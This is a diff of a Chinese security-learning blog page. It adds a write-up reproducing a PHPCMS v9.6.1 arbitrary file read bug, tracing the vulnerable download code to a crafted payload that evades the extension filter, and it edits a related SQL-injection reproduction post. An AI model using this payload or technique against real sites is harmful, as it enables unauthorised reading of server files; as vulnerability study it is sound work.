@@ -324,7 +324,169 @@
                 
               
 
-              <time title="Erstellt: 2019-07-20 18:06:24 / Geändert am: 18:07:30" itemprop="dateCreated datePublished" datetime="2019-07-20T18:06:24+08:00">2019-07-20</time>
+              <time title="Erstellt: 2019-07-20 18:06:24" itemprop="dateCreated datePublished" datetime="2019-07-20T18:06:24+08:00">2019-07-20</time>
+            </span>
+          
+
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Bearbeitet am</span>
+                
+                <time title="Geändert am: 2019-07-22 16:25:08" itemprop="dateModified" datetime="2019-07-22T16:25:08+08:00">2019-07-22</time>
+              </span>
+            
+          
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          <br>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>today is a solider</p>
+<p>Today’s laziness is all about digging holes for the future.</p>
+<p>Learning frequency is not enough, work harder……</p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/22/phpcmsv9任意文件读取漏洞/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="cookie">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="The clown is laughing at you">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/07/22/phpcmsv9任意文件读取漏洞/" class="post-title-link" itemprop="url">phpcmsv9任意文件读取漏洞[复现]</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+
+          
+          
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+
+              
+                
+              
+
+              <time title="Erstellt: 2019-07-22 16:20:11 / Geändert am: 19:06:02" itemprop="dateCreated datePublished" datetime="2019-07-22T16:20:11+08:00">2019-07-22</time>
             </span>
           
 
@@ -370,9 +532,20 @@
       
         
           
-            <p>today is a solider</p>
-<p>今天偷的懒，都是给未来挖的坑。</p>
-<p>学习频率不够，加把劲….</p>
+            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>  phpcmsv9.6.1<br>  ubuntu19<br>  mysql+php5.6</p>
+<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>这个漏洞，除了本身的触发点外，payload的构造方法，和phpcms9.6.0构造payload方法大致一样</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="漏洞触发的点"><a href="#漏洞触发的点" class="headerlink" title="漏洞触发的点"></a>漏洞触发的点</h2><p>定位：./phpcms/modules/content/down.php::download()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">download</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	$a_k = trim($_GET[<span class="string">'a_k'</span>]);</span><br><span class="line">	$pc_auth_key = md5(pc_base::load_config(<span class="string">'system'</span>,<span class="string">'auth_key'</span>).$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>].<span class="string">'down'</span>);</span><br><span class="line">	$a_k = sys_auth($a_k, <span class="string">'DECODE'</span>, $pc_auth_key);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>($a_k)) showmessage(L(<span class="string">'illegal_parameters'</span>));</span><br><span class="line">	<span class="keyword">unset</span>($i,$m,$f,$t,$ip);</span><br><span class="line">	$a_k = safe_replace($a_k);</span><br><span class="line">	parse_str($a_k);		</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($i)) $downid = intval($i);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>($m)) showmessage(L(<span class="string">'illegal_parameters'</span>));</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>($modelid)) showmessage(L(<span class="string">'illegal_parameters'</span>));</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>($f)) showmessage(L(<span class="string">'url_invalid'</span>));</span><br><span class="line">	<span class="keyword">if</span>(!$i || $m&lt;<span class="number">0</span>) showmessage(L(<span class="string">'illegal_parameters'</span>));</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>($t)) showmessage(L(<span class="string">'illegal_parameters'</span>));</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>($ip)) showmessage(L(<span class="string">'illegal_parameters'</span>));</span><br><span class="line">	$starttime = intval($t);</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">'/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i'</span>,$f) || strpos($f, <span class="string">":\\"</span>)!==<span class="keyword">FALSE</span> || strpos($f,<span class="string">'..'</span>)!==<span class="keyword">FALSE</span>) showmessage(L(<span class="string">'url_error'</span>));</span><br><span class="line">	$fileurl = trim($f);</span><br><span class="line">	<span class="keyword">if</span>(!$downid || <span class="keyword">empty</span>($fileurl) || !preg_match(<span class="string">"/[0-9]&#123;10&#125;/"</span>, $starttime) || !preg_match(<span class="string">"/[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;/"</span>, $ip) || $ip != ip()) showmessage(L(<span class="string">'illegal_parameters'</span>));	</span><br><span class="line">	$endtime = SYS_TIME - $starttime;</span><br><span class="line">	<span class="keyword">if</span>($endtime &gt; <span class="number">3600</span>) showmessage(L(<span class="string">'url_invalid'</span>));</span><br><span class="line">	<span class="keyword">if</span>($m) $fileurl = trim($s).trim($fileurl);</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">'/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i'</span>,$fileurl) ) showmessage(L(<span class="string">'url_error'</span>));</span><br><span class="line">	<span class="comment">//远程文件</span></span><br><span class="line">	<span class="keyword">if</span>(strpos($fileurl, <span class="string">':/'</span>) &amp;&amp; (strpos($fileurl, pc_base::load_config(<span class="string">'system'</span>,<span class="string">'upload_url'</span>)) === <span class="keyword">false</span>)) &#123; </span><br><span class="line">		header(<span class="string">"Location: $fileurl"</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">if</span>($d == <span class="number">0</span>) &#123;</span><br><span class="line">			header(<span class="string">"Location: "</span>.$fileurl);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$fileurl = str_replace(<span class="keyword">array</span>(pc_base::load_config(<span class="string">'system'</span>,<span class="string">'upload_url'</span>),<span class="string">'/'</span>), <span class="keyword">array</span>(pc_base::load_config(<span class="string">'system'</span>,<span class="string">'upload_path'</span>),DIRECTORY_SEPARATOR), $fileurl);</span><br><span class="line">			$filename = basename($fileurl);</span><br><span class="line">			<span class="comment">//处理中文文件</span></span><br><span class="line">			<span class="keyword">if</span>(preg_match(<span class="string">"/^([\s\S]*?)([\x81-\xfe][\x40-\xfe])([\s\S]*?)/"</span>, $fileurl)) &#123;</span><br><span class="line">				$filename = str_replace(<span class="keyword">array</span>(<span class="string">"%5C"</span>, <span class="string">"%2F"</span>, <span class="string">"%3A"</span>), <span class="keyword">array</span>(<span class="string">"\\"</span>, <span class="string">"/"</span>, <span class="string">":"</span>), urlencode($fileurl));</span><br><span class="line">				$filename = urldecode(basename($filename));</span><br><span class="line">			&#125;</span><br><span class="line">			$ext = fileext($filename);</span><br><span class="line">			$filename = date(<span class="string">'Ymd_his'</span>).random(<span class="number">3</span>).<span class="string">'.'</span>.$ext;</span><br><span class="line">			$fileurl = str_replace(<span class="keyword">array</span>(<span class="string">'&lt;'</span>,<span class="string">'&gt;'</span>), <span class="string">''</span>,$fileurl);</span><br><span class="line">			file_down($fileurl, $filename);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>我们先看到file_down()函数，跟进这个函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">file_down</span><span class="params">($filepath, $filename = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!$filename) $filename = basename($filepath);</span><br><span class="line">	<span class="keyword">if</span>(is_ie()) $filename = rawurlencode($filename);</span><br><span class="line">	$filetype = fileext($filename);</span><br><span class="line">	$filesize = sprintf(<span class="string">"%u"</span>, filesize($filepath));</span><br><span class="line">	<span class="keyword">if</span>(ob_get_length() !== <span class="keyword">false</span>) @ob_end_clean();</span><br><span class="line">	header(<span class="string">'Pragma: public'</span>);</span><br><span class="line">	header(<span class="string">'Last-Modified: '</span>.gmdate(<span class="string">'D, d M Y H:i:s'</span>) . <span class="string">' GMT'</span>);</span><br><span class="line">	header(<span class="string">'Cache-Control: no-store, no-cache, must-revalidate'</span>);</span><br><span class="line">	header(<span class="string">'Cache-Control: pre-check=0, post-check=0, max-age=0'</span>);</span><br><span class="line">	header(<span class="string">'Content-Transfer-Encoding: binary'</span>);</span><br><span class="line">	header(<span class="string">'Content-Encoding: none'</span>);</span><br><span class="line">	header(<span class="string">'Content-type: '</span>.$filetype);</span><br><span class="line">	header(<span class="string">'Content-Disposition: attachment; filename="'</span>.$filename.<span class="string">'"'</span>);</span><br><span class="line">	header(<span class="string">'Content-length: '</span>.$filesize);</span><br><span class="line">	readfile($filepath);</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>其中<code>readfile($filepath);</code>,$filepath来自于传入的参数，回到download()，看看download()函数中传入的参数来自于$fileurl。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$a_k = trim($_GET[<span class="string">'a_k'</span>]);</span><br><span class="line">$pc_auth_key = md5(pc_base::load_config(<span class="string">'system'</span>,<span class="string">'auth_key'</span>).$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>].<span class="string">'down'</span>);</span><br><span class="line">$a_k = sys_auth($a_k, <span class="string">'DECODE'</span>, $pc_auth_key);</span><br><span class="line">... ... </span><br><span class="line">... ...</span><br><span class="line"><span class="keyword">unset</span>($i,$m,$f,$t,$ip);</span><br><span class="line">$a_k = safe_replace($a_k);</span><br><span class="line">parse_str($a_k)</span><br><span class="line">... ...</span><br><span class="line">... ...</span><br><span class="line">$fileurl = trim($f);</span><br><span class="line">... ...</span><br><span class="line">... ...</span><br><span class="line"><span class="keyword">if</span>($m) $fileurl = trim($s).trim($fileurl);</span><br><span class="line">... ...</span><br><span class="line">... ...</span><br><span class="line">$fileurl = str_replace(<span class="keyword">array</span>(pc_base::load_config(<span class="string">'system'</span>,<span class="string">'upload_url'</span>),<span class="string">'/'</span>), <span class="keyword">array</span>(pc_base::load_config(<span class="string">'system'</span>,<span class="string">'upload_path'</span>),DIRECTORY_SEPARATOR), $fileurl);</span><br></pre></td></tr></table></figure></p>
+<p>可以看到$fileurl来自于$s和$f的拼接，而$f和$s来自于$a_K经过parse_str()作用，$a_k，我们可控。<br>可以看到代码中的<code>$pc_auth_key</code>这一段密文，然后$a_k来自于<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a_k = sys_auth($a_k, <span class="string">'DECODE'</span>, $pc_auth_key);</span><br></pre></td></tr></table></figure></p>
+<p>所以我们现在是需要一段通过<code>$pc_auth_key</code>加密的密文，这段密文的获取，我们看到函数init()<br>定位：./phpcms/modules/content/down.php::init() 77行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(strpos($f, <span class="string">'http://'</span>) !== <span class="keyword">FALSE</span> || strpos($f, <span class="string">'ftp://'</span>) !== <span class="keyword">FALSE</span> || strpos($f, <span class="string">'://'</span>) === <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">			$pc_auth_key = md5(pc_base::load_config(<span class="string">'system'</span>,<span class="string">'auth_key'</span>).$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>].<span class="string">'down'</span>);</span><br><span class="line">			$a_k = urlencode(sys_auth(<span class="string">"i=$i&amp;d=$d&amp;s=$s&amp;t="</span>.SYS_TIME.<span class="string">"&amp;ip="</span>.ip().<span class="string">"&amp;m="</span>.$m.<span class="string">"&amp;f=$f&amp;modelid="</span>.$modelid, <span class="string">'ENCODE'</span>, $pc_auth_key));</span><br><span class="line">			$downurl = <span class="string">'?m=content&amp;c=down&amp;a=download&amp;a_k='</span>.$a_k;</span><br></pre></td></tr></table></figure></p>
+<p>这里的$pc_auth_key和我们所需要的一样，并且这里提供密文$a_k，<br>所以我们构造$a_k,然后访问init()方法，就能达到触发漏洞的作用</p>
+<p>分析一下$a_k，如何构造。<br>和之前的sql注入一个道理，我们从/phpcms/modules/attachment/attachments.php::swfupload_json()。这里就不重复说明了<br>这次复现，让我卡了很久的是这个payload的构造，该构造什么样的payload，传入src，才能从cookie得到正确的密文。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">swfupload_json()</span><br><span class="line"> $arr[<span class="string">'src'</span>] = safe_replace(trim($_GET[<span class="string">'src'</span>])); </span><br><span class="line"> ... ...</span><br><span class="line">init()传入</span><br><span class="line"> $a_k = trim($_GET[<span class="string">'a_k'</span>]);</span><br><span class="line"> ... ...</span><br><span class="line"> $a_k = safe_replace($a_k);</span><br><span class="line"> parse_str($a_k);</span><br><span class="line"> ... ...</span><br><span class="line"> $pc_auth_key = md5(pc_base::load_config(<span class="string">'system'</span>,<span class="string">'auth_key'</span>).$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>].<span class="string">'down'</span>);</span><br><span class="line"> $a_k = urlencode(sys_auth(<span class="string">"i=$i&amp;d=$d&amp;s=$s&amp;t="</span>.SYS_TIME.<span class="string">"&amp;ip="</span>.ip().<span class="string">"&amp;m="</span>.$m.<span class="string">"&amp;f=$f&amp;modelid="</span>.$modelid, <span class="string">'ENCODE'</span>, $pc_auth_key));</span><br><span class="line"> $downurl = <span class="string">'?m=content&amp;c=down&amp;a=download&amp;a_k='</span>.$a_k; </span><br><span class="line"> ... ...</span><br><span class="line">到download()</span><br><span class="line"> $a_k = safe_replace($a_k);</span><br><span class="line"> parse_str($a_k);</span><br><span class="line"> ... ...</span><br><span class="line"> <span class="keyword">if</span>(preg_match(<span class="string">'/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i'</span>,$f) || strpos($f, <span class="string">":\\"</span>)!==<span class="keyword">FALSE</span> || strpos($f,<span class="string">'..'</span>)!==<span class="keyword">FALSE</span>) showmessage(L(<span class="string">'url_error'</span>));</span><br><span class="line">		$fileurl = trim($f);</span><br><span class="line"> ... ...</span><br><span class="line"> <span class="keyword">if</span>(preg_match(<span class="string">'/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i'</span>,$fileurl) ) showmessage(L(<span class="string">'url_error'</span>));</span><br><span class="line"> ... ...</span><br><span class="line"> $fileurl = str_replace(<span class="keyword">array</span>(<span class="string">'&lt;'</span>,<span class="string">'&gt;'</span>), <span class="string">''</span>,$fileurl);</span><br><span class="line"> file_down($fileurl, $filename);</span><br></pre></td></tr></table></figure></p>
+<p>故而<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s=./phpcms/modules/content/down.ph&amp;f=p%<span class="number">3</span>%<span class="number">25252</span>%<span class="number">2</span>*<span class="number">70</span>C</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/07/22/phpcmsv9任意文件读取漏洞/1.png" alt=""></p>
+<p>参考<a href="https://www.anquanke.com/post/id/86007" target="_blank" rel="noopener">【漏洞分析】PHPCMS V9.6.1 任意文件读取漏洞分析</a></p>
+<p><img src="/2019/07/22/phpcmsv9任意文件读取漏洞/2.png" alt=""></p>
+<h1 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h1><p>发现自己真的不行，代码的理解能力有待提高，编程能力有待提高，啥都有待提高……加油吧……</p>
 
           
         
@@ -837,7 +1010,7 @@
                 
                   <span class="post-meta-item-text">Bearbeitet am</span>
                 
-                <time title="Geändert am: 2019-07-20 23:05:51" itemprop="dateModified" datetime="2019-07-20T23:05:51+08:00">2019-07-20</time>
+                <time title="Geändert am: 2019-07-22 17:12:11" itemprop="dateModified" datetime="2019-07-22T17:12:11+08:00">2019-07-22</time>
               </span>
             
           
@@ -879,7 +1052,7 @@
         
           
             <h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>ubuntu19<br>php5.6+mysql<br>phpstorm+burpsuit<br>phpcmsv9.6.0(我下载的版本UTF8)</p>
-<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>太差劲了，啥都不会，然后POC都搞不懂，代码逻辑的理解能力差到抠脚，干啥啥不会……要善于使用debug,能解决大量的代码问题。菜的明明白白。然后这次复现的漏洞，我看了一些文章，发现这个漏洞确实鸡肋，但是我觉得我这啥都不会的，就无所谓鸡肋了，能有收获就好了，这个漏洞的逻辑性，我觉得也挺有意思的。</p>
+<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>太差劲了，啥都不会，然后POC都搞不懂，代码逻辑的理解能力差到抠脚，干啥啥不会……要善于使用debug,能解决大量的代码问题。菜的明明白白。然后这次复现的漏洞，我看了一些文章，有些大佬说这个漏洞鸡肋，思索了一下，无所谓鸡肋了，能有收获就好了，这个漏洞的逻辑性，我觉得也挺有意思的。</p>
 <h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>由于代码对于cookie的过滤，以及sql过滤不当，使得我们可以插入sql报错语句，进行报错注入。</p>
 <h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>之前的phpcms的路由分析，我已经分(chao)析(xi)得很详细了…..在我的另外一篇博客里，然后这里就直接看到漏洞代码<br>然后像phpcms这样的，面对对象的系统框架，在查看每一个类的方法是，都要先去看一下，这个类中定义的变量和构造方法<br>定位：phpcms/modules/attachment/attachements.php::swfupload_json()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> $att_db;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	pc_base::load_app_func(<span class="string">'global'</span>);<span class="comment">//加载global.func.php</span></span><br><span class="line">	<span class="keyword">$this</span>-&gt;upload_url = pc_base::load_config(<span class="string">'system'</span>,<span class="string">'upload_url'</span>);<span class="comment">//http://127.0.0.1/phpcms/uploadfile/</span></span><br><span class="line">	<span class="keyword">$this</span>-&gt;upload_path = pc_base::load_config(<span class="string">'system'</span>,<span class="string">'upload_path'</span>);<span class="comment">//PHPCMS_PATH.'uploadfile/'</span></span><br><span class="line">	<span class="keyword">$this</span>-&gt;imgext = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'gif'</span>,<span class="string">'png'</span>,<span class="string">'bmp'</span>,<span class="string">'jpeg'</span>);</span><br><span class="line">	<span class="keyword">$this</span>-&gt;userid = $_SESSION[<span class="string">'userid'</span>] ? $_SESSION[<span class="string">'userid'</span>] : (param::get_cookie(<span class="string">'_userid'</span>) ? param::get_cookie(<span class="string">'_userid'</span>) : sys_auth($_POST[<span class="string">'userid_flash'</span>],<span class="string">'DECODE'</span>));</span><br><span class="line">	<span class="keyword">$this</span>-&gt;isadmin = <span class="keyword">$this</span>-&gt;admin_username = $_SESSION[<span class="string">'roleid'</span>] ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;groupid = param::get_cookie(<span class="string">'_groupid'</span>) ? param::get_cookie(<span class="string">'_groupid'</span>) : <span class="number">8</span>;</span><br><span class="line">	<span class="comment">//判断是否登录</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;userid))&#123;</span><br><span class="line">		showmessage(L(<span class="string">'please_login'</span>,<span class="string">''</span>,<span class="string">'member'</span>));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">... ...</span><br><span class="line">... ...</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">swfupload_json</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	$arr[<span class="string">'aid'</span>] = intval($_GET[<span class="string">'aid'</span>]);</span><br><span class="line">	$arr[<span class="string">'src'</span>] = safe_replace(trim($_GET[<span class="string">'src'</span>]));</span><br><span class="line">	$arr[<span class="string">'filename'</span>] = urlencode(safe_replace($_GET[<span class="string">'filename'</span>]));</span><br><span class="line">	$json_str = json_encode($arr);</span><br><span class="line">	$att_arr_exist = param::get_cookie(<span class="string">'att_json'</span>);<span class="comment">//第一次访问，所以这个值是空的</span></span><br><span class="line">	$att_arr_exist_tmp = explode(<span class="string">'||'</span>, $att_arr_exist);<span class="comment">//空的......</span></span><br><span class="line">	<span class="keyword">if</span>(is_array($att_arr_exist_tmp) &amp;&amp; in_array($json_str, $att_arr_exist_tmp)) &#123; <span class="comment">//$att_arr_exist_tmp不存在，执行else语句</span></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		$json_str = $att_arr_exist ? $att_arr_exist.<span class="string">'||'</span>.$json_str : $json_str;</span><br><span class="line">		param::set_cookie(<span class="string">'att_json'</span>,$json_str);</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;			</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>关键代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;userid = $_SESSION[<span class="string">'userid'</span>] ? $_SESSION[<span class="string">'userid'</span>] : (param::get_cookie(<span class="string">'_userid'</span>) ? param::get_cookie(<span class="string">'_userid'</span>) : sys_auth($_POST[<span class="string">'userid_flash'</span>],<span class="string">'DECODE'</span>));</span><br></pre></td></tr></table></figure></p>
@@ -900,6 +1073,8 @@
 <p><img src="/2019/07/18/phpcmsv9sql注入漏洞-复现/3.png" alt=""></p>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>今天复现的时候，有一个地方一直没懂，就是这个payload中的id是怎么传入程序中，然后自己debug了一下，就是不理解为啥要在id前，甚至每个变量名前加&amp;,然后对照体会了一下，恍然大悟<br><img src="/2019/07/18/phpcmsv9sql注入漏洞-复现/4.png" alt=""><br><img src="/2019/07/18/phpcmsv9sql注入漏洞-复现/5.png" alt=""></p>
 <p>还是要多学，而且时间觉得很紧，希望自己能够把时间合理使用，今天其实挺无奈的，没有理解&amp;id…..然后浪费了很多时间，群里一个师傅教我怎么动态调试，debug熟练使用真的能很好的理解代码。</p>
+<p>关于鸡肋这个问题，就是当管理员注销的时候，这个漏洞就无法使用。</p>
+<p>因为当管理员注销后，我们之前造的cookei,也就随之过期了，然而我们又无法在管理员注销的情况下，再伪造cookie，cookie 不对，所以这个注入也就无效。</p>
 
           
         
@@ -1868,191 +2043,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/11/xxxdisk前台Getshell-复现/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="cookie">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="The clown is laughing at you">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/07/11/xxxdisk前台Getshell-复现/" class="post-title-link" itemprop="url">xxxdisk前台Getshell[复现]</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-
-          
-          
-          
-
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Veröffentlicht am</span>
-              
-
-              
-                
-              
-
-              <time title="Erstellt: 2019-07-11 17:47:53" itemprop="dateCreated datePublished" datetime="2019-07-11T17:47:53+08:00">2019-07-11</time>
-            </span>
-          
-
-          
-            
-
-            
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Bearbeitet am</span>
-                
-                <time title="Geändert am: 2019-07-12 20:33:37" itemprop="dateModified" datetime="2019-07-12T20:33:37+08:00">2019-07-12</time>
-              </span>
-            
-          
-
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          <br>
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
